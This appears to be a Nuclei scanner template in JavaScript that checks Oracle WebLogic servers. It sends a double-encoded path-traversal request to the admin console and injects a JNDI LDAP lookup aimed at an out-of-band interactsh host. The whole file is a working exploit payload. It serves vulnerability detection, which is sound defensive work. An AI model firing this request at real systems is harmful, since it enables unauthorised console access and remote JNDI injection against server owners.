const net = require('nuclei/net');
const addr = Host + ":" + Port;

// Split interactsh hostname at last dot for semicolon injection.
// JndiBindingHandle splits on ";" then rejoins with "." — so
// "ldap://abc.oast;fun:1389/x;AdminServer" becomes
// "ldap://abc.oast.fun:1389/x" after the handle reconstructs it.
let lastDot = oast.lastIndexOf(".");
let prefix = oast.substring(0, lastDot);
let suffix = oast.substring(lastDot + 1);

let jndi = "ldap://" + prefix + ";" + suffix + ":1389/x;AdminServer";
let path = "/console/css/%252e%252e%252fconsolejndi.portal" + "?_pageLabel=JNDIBindingPageGeneral&_nfpb=true" + "&JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22" + jndi + "%22)";

let req = "GET " + path + " HTTP/1.1\r\n" + "Host: " + addr + "\r\n" + "Connection: close\r\n\r\n";

let c = net.Open('tcp', addr);
c.SetTimeout(15);
c.Send(req);
let resp = "";
try {
    resp = c.RecvString();
} catch (e) {}
try {
    c.Close();
} catch (e) {}

let matched = resp.indexOf("ADMINCONSOLESESSION") !== -1;
Export({
    matched: matched
});

